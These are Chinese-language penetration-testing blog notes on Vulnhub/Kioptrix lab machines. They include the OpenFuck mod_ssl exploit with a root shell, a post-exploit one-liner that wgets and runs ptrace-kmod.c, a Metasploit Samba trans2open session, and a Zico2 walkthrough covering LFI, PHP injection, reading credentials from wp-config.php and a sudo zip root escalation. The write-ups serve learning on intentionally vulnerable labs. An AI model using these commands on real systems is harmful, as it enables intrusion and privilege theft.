### 第961行修改及编译运行说明

首先，在第961行进行如下修改：
```c
const unsigned char *p, *end;
```

然后，使用以下命令编译代码：
```sh
gcc -o OpenFuck 764.c -lcrypto
```

接着，运行脚本并选择相应的系统版本。例如，选择 `0x6b`：
```sh
./OpenFuck 0x6b 192.168.43.54
```

运行结果如下：
```sh
root@kali:~/Desktop# ./OpenFuck 0x6b 192.168.43.54 
*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************
Establishing SSL connection 
cipher: 0x4043808c   ciphers: 0x80f80e0 
Ready to send shellcode 
Spawning shell... 
bash: no job control in this shell 
bash-2.05$  
bash-2.05$ unset HISTFILE; cd /tmp; wget http://dl.packetstormsecurity.net/030exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p;  
--04:04:37--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c 
           => `ptrace-kmod.c' 
Connecting to dl.packetstormsecurity.net:80... connected! 
HTTP request sent, awaiting response... 301 Moved Permanently 
Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following] 
--04:04:38--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c 
           => `ptrace-kmod.c' 
Connecting to dl.packetstormsecurity.net:443... connected! 
HTTP request sent, awaiting response... 200 OK 
Length: 3,921 [text/x-csrc] 
    0K ...                                                   100% @   3.74 MB/s 
04:04:39 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921] 
[+] Attached to 6498 
[+] Waiting for signal 
[+] Signal caught 
[+] Shellcode placed at 0x4001189d 
[+] Now wait for suid shell... 
id 
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) 
whoami 
root 
```

### Samba漏洞利用

#### 实验环境
实验环境中存在一个Samba漏洞。使用`enum4linux`工具通过SMB协议枚举Windows系统和SAMBA服务，获取目标系统的用户账号、组账号、共享目录、密码策略等重要信息。然而，本地环境未检测到Samba的版本。

该漏洞为Samba trans2open溢出（Linux x86），在Samba 2.2.0到2.2.8版本中发现的缓冲区溢出。可以在`searchsploit`中查到相关信息。

#### 使用Metasploit进行实验

```sh
msf exploit(linux/samba/trans2open) > show options
Module options (exploit/linux/samba/trans2open):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.43.54   yes       The target address
   RPORT  139              yes       The target port (TCP)

Payload options (linux/x86/shell_bind_tcp):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST  192.168.43.54   no        The target address

Exploit target:
   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce

msf exploit(linux/samba/trans2open) > exploit
[*] Started bind handler
[*] 192.168.43.54:139 - Trying return address 0xbffffdfc...
[*] 192.168.43.54:139 - Trying return address 0xbffffcfc...
[*] 192.168.43.54:139 - Trying return address 0xbffffbfc...
[*] 192.168.43.54:139 - Trying return address 0xbffffafc...
[*] Command shell session 2 opened (192.168.43.177:33375 -> 192.168.43.54:4444) at 2018-05-07 04:47:42 -0400
id
uid=0(root) gid=0(root) groups=99(nobody)
```

### 总结

尽管这个实验环境较为老旧，一些漏洞在实际中可能已不常见，但在利用过程中可以学习到Kali Linux工具的使用和实战思路。

### Vulnhub渗透测试练习 - Zico2

**标题**: Vulnhub渗透测试练习 - Zico2  
**日期**: 2018-05-05 22:30:35  
**分类**: 笔记  
**作者**: Ukonw

#### 靶机地址
- [Zico2](https://www.vulnhub.com/entry/zico2-1,210/)

#### 练习环境
- Kali Linux
- VirtualBox

#### 信息收集
使用`netdiscover`获取靶机IP地址：
```sh
root@kali:~# netdiscover
Currently scanning: 192.168.56.0/24 | Screen View: Unique Hosts
13 Captured ARP Req/Rep packets, from 4 hosts. Total size: 780
___________________________________________________________________________
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname
----------------------------------------------------------------------------
 192.168.56.102  00:0C:29:B2:76:40      4     240  VMware, Inc.
```
获取到的IP地址为`192.168.56.102`。

使用`nmap`扫描端口信息：
```sh
nmap -A 192.168.56.102
```
结果显示80端口上运行着一个Web服务器。

#### 漏洞利用
浏览页面时发现了一个文件包含漏洞：
```sh
view.php?page=tools.html
```
尝试包含`../../etc/passwd`成功后，使用`dirb`扫描网站目录，发现`dbadmin`目录。该目录使用phpLiteAdmin v1.9.3，存在远程PHP代码注入漏洞。

利用默认密码`admin`登录，创建一个数据库并写入shell代码。在本地启动Apache Web服务器并添加恶意代码，利用之前发现的本地文件包含漏洞下载执行shell。

#### 权限提升
反弹shell后，检查目录发现`/home/zico`下的wordpress目录。查看`wp-config.php`文件，找到用户`zico`的登录凭证，使用SSH连接：
```sh
ssh zico@192.168.56.102
```
利用`sudo -l`查看当前用户可执行与无法执行的指令，发现`zico`可以无密码执行`tar`和`zip`命令。利用此权限创建随机文件并压缩，从而获取root权限：
```sh
sudo zip exploit.zip exploit -T --unzip-command="python -c 'import pty; pty.spawn(\"/bin/sh\")'"
```
最终进入`/root`目录，读取flag文件：
```sh
cat /root/flag.txt
```

### 总结
Vulnhub提供了多种渗透测试环境，通过这次完整的渗透过程，学到了很多工具和技术。特别是在权限提升方面，学会了利用`touch`和`zip`命令提权的方法。

### Vulnhub渗透测试练习 - Kioptrix 3

**标题**: Vulnhub渗透测试练习 - Kioptrix 3  
**日期**: 2018-05-08 20:01:26  
**分类**: 笔记  
**作者**: Ukonw

#### 信息收集
使用`netdiscover`发现目标主机：
```sh
root@kali:~# netdiscover
Currently scanning: 192.168.43.0/24 | Screen View: Unique Hosts
13 Captured ARP Req/Rep packets, from 4 hosts. Total size: 780
___________________________________________________________________________
  IP            At MAC Address     Count     Len  MAC Vendor / Hostname
----------------------------------------------------------------------------
 192.168.43.158  00:0C:29:38:2D:6F      1      60  VMware, Inc.
```
目标IP为`192.168.43.158`。

使用`nmap`扫描目标主机端口信息：
```sh
nmap -A -sS -n 192.168.43.158
```
结果显示：
- SSH: OpenSSH 4.7p1 Debian 8ubuntu1.2
- HTTP: Apache httpd 2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch

#### 漏洞利用
80端口显示CMS为Lotus CMS。使用`dirb`或御剑扫描目录，发现存在`phpdamin`后台：
```sh
http://192.168.43.158/index.php?system=Admin
```

### 总结
通过这些渗透测试练习，不仅掌握了多种工具的使用方法，还提高了实战经验和英语阅读能力。希望未来能继续学习更多渗透测试技巧。